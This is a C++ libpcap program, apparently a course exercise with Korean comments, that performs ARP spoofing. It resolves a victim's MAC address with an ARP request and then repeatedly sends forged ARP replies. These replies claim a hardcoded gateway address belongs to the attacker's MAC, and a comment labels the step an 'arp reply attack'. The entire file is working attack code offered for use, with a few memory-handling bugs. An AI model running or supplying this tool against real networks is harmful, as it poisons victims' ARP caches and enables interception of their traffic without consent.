#include <cstdio>
#include <stdlib.h>
#include <signal.h>
#include <pcap/pcap.h>
#include <sys/types.h>          //for socket
#include <sys/socket.h>         //for socket
#include <sys/ioctl.h>          //for ioctl function
#include <arpa/inet.h>
#include <linux/if_ether.h>     //for ETH_P_ARP
#include <net/if.h>             //for ioctl third argument
#include <unistd.h>             //for close function
#include <string.h>
#include <netinet/ether.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void  INThandler(int sig)
{
     char  c;
 
     signal(sig, SIG_IGN);
     printf("OUCH, did you hit Ctrl-C?\n"
            "Do you really want to quit? [y/n] ");
     c = getchar();
     if (c == 'y' || c == 'Y')
          exit(0);
     else
          signal(SIGINT, INThandler);
     getchar(); // Get new line character
}

void usage() { //경고 메시지
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int getMy_IP(char *MyIp, char *argv){ //나의 Ip address 가져오기
    int sock;
    struct ifreq ifr;


    sock = socket(AF_PACKET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        close(sock);
        return -1;
    }
    strcpy(ifr.ifr_name, argv);
    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0)
    {
        perror("ioctl() - get ip");
        close(sock);
        return -1;
    }
    struct sockaddr_in *addr;
    addr =(struct sockaddr_in*)&ifr.ifr_addr;
    memcpy(MyIp, inet_ntoa(addr-> sin_addr), sizeof(ifr.ifr_addr));
    close(sock);
    return 1;

}

int getMacAddress(uint8_t *MyMac, char *argv){ //나의 Mac address 가져오기
    int sock;
    struct ifreq ifr;


    sock = socket(AF_PACKET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        close(sock);
        return -1;
    }
    strcpy(ifr.ifr_name, argv);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0)
    {
        perror("ioctl() - get mac");
        close(sock);
        return -1;
    }
    memcpy(MyMac, ifr.ifr_hwaddr.sa_data,6);

    close(sock);
    return 1;
}

Mac ArpRequest(pcap_t* handle, uint8_t *mac, char *ip, char* snder_ip){ //ARP Request 발송
    struct EthArpPacket *packet=(struct EthArpPacket *)malloc(sizeof(struct EthArpPacket));
    packet->eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet->eth_.smac_ = Mac(mac);
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(ArpHdr::Request); //Reply 바꾼다(arp reply attack)
	packet->arp_.smac_ = Mac(mac);
	packet->arp_.sip_ = htonl(Ip(ip));
	packet->arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet->arp_.tip_ = htonl(Ip(snder_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    free(packet);

    //ARP Reply 패킷 캡처
    struct EthArpPacket *reply_packet=(struct EthArpPacket *)malloc(sizeof(struct EthArpPacket));
    while(true){
		struct pcap_pkthdr* header = (struct pcap_pkthdr*)malloc(sizeof(struct pcap_pkthdr));
		const u_char* packet_re;
		int res = pcap_next_ex(handle, &header, &packet_re);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		reply_packet = (struct EthArpPacket*)(packet_re);

		if (reply_packet->eth_.type_ == htons(EthHdr::Arp) && reply_packet->arp_.op_== htons(ArpHdr::Reply)){
            break;
        }
    }

    Mac query_mac = reply_packet->arp_.smac();
    free(reply_packet);
    return query_mac;
}

void ArpReply(pcap_t* handle, uint8_t *mac, Mac query_mac, char* snder_ip, char* target_ip){
    struct EthArpPacket *s_packet=(struct EthArpPacket *)malloc(sizeof(struct EthArpPacket));
	s_packet->eth_.dmac_ = Mac(query_mac);
	s_packet->eth_.smac_ = Mac(mac);
	s_packet->eth_.type_ = htons(EthHdr::Arp);
	s_packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	s_packet->arp_.pro_ = htons(EthHdr::Ip4);
	s_packet->arp_.hln_ = Mac::SIZE;
	s_packet->arp_.pln_ = Ip::SIZE;
	s_packet->arp_.op_ = htons(ArpHdr::Reply); //Reply 바꾼다(arp reply attack)
	s_packet->arp_.smac_ = Mac(mac);
	s_packet->arp_.sip_ = htonl(Ip("192.168.43.1"));
	s_packet->arp_.tmac_ = Mac(query_mac);
	s_packet->arp_.tip_ = htonl(Ip("192.168.43.166"));

    signal(SIGINT, INThandler); // 인터럽트 시그널 콜백 설정

    while(true){
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(s_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("ARP Spoofing\n");
        sleep(3);
        pause();
    }
    free(s_packet);
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1]; //interface
    Mac query_mac; //알고자 하는 mac address 저장
    char* snder_ip = argv[2];   //snder ip address
	char* target_ip = argv[3];  //target ip address
    char MyIp[20];              //나의 IP 저장 변수
    getMy_IP(MyIp, argv[1]);    //나의 IP
    uint8_t MyMac[6];           //나의 MAC 저장 변수
    getMacAddress(MyMac, argv[1]); //나의 MAC
	char errbuf[PCAP_ERRBUF_SIZE];


	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    
    //ARP Request 
    //ArpRequest 발송 후 ArpReply를 통해 알고자 하는 Mac address 주소 확보
	query_mac = ArpRequest(handle, MyMac, MyIp, snder_ip);
    

    //ARP Reply
    ArpReply(handle, MyMac, query_mac, snder_ip, target_ip);
    

	pcap_close(handle);
}
